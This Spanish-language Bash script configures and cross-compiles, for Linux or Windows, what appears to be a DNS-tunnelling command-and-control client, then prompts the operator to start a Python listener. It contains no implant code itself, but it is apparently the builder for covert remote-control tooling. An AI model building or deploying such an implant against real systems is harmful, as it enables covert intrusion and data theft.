#!/bin/bash

# Ruta al archivo de configuración
CONFIG_FILE="dns_client/src/config.rs"

# Pedir la nueva IP
read -p "Introduce la nueva IP del servidor DNS: " NUEVA_IP

if [[ -z "$NUEVA_IP" ]]; then
    echo "❌ IP no válida. Abortando."
    exit 1
fi

# Reemplazar la IP en el archivo de configuración
sed -i "s/dns_server: \".*\"/dns_server: \"$NUEVA_IP\"/" "$CONFIG_FILE"
echo "✅ IP actualizada a $NUEVA_IP en $CONFIG_FILE."

# Mostrar otras variables editables
echo -e "\n📌 Otras variables que puedes editar manualmente en $CONFIG_FILE:"
echo " - base_domain: dominio usado para las peticiones DNS"
echo " - delay_check_comando: tiempo entre comandos"
echo " - delay_respuesta: retardo en respuestas"
echo " - dns_timeout: tiempo de espera para DNS"
echo " - max_frags: número máximo de fragmentos"
echo " - max_label_len: longitud máxima de etiquetas"
echo " - Y los subdominios de cada comunicacion los cuales hay que cambiar tento en el server como en el cleinte -"

# Preguntar por el sistema operativo de destino
echo -e "\n¿Para qué sistema operativo deseas compilar el binario?"
echo "1) Linux"
echo "2) Windows"
read -p "Opción [1-2]: " OPCION

# Obtener nombre del binario
BIN_NAME="dns_client"

echo "🛠️ Compilando el proyecto..."

case "$OPCION" in
  1)
    cargo build --release --manifest-path dns_client/Cargo.toml || { echo "❌ Error al compilar para Linux."; exit 1; }
    BIN_PATH="dns_client/target/release/$BIN_NAME"
    cp "$BIN_PATH" dns_client_bin && echo "✅ Binario copiado al directorio actual: $(basename "$BIN_PATH")_bin"
    ;;
  2)
    rustup target add x86_64-pc-windows-gnu
    cargo build --release --target x86_64-pc-windows-gnu --manifest-path dns_client/Cargo.toml || { echo "❌ Error al compilar para Windows."; exit 1; }
    BIN_PATH="dns_client/target/x86_64-pc-windows-gnu/release/$BIN_NAME.exe"
    cp "$BIN_PATH" . && echo "✅ Binario copiado al directorio actual: $(basename "$BIN_PATH")"
    ;;
  *)
    echo "❌ Opción no válida."
    exit 1
    ;;
esac

echo '💀 Ejecute "python3 dns_server/main.py" para ponerse en escucha...'
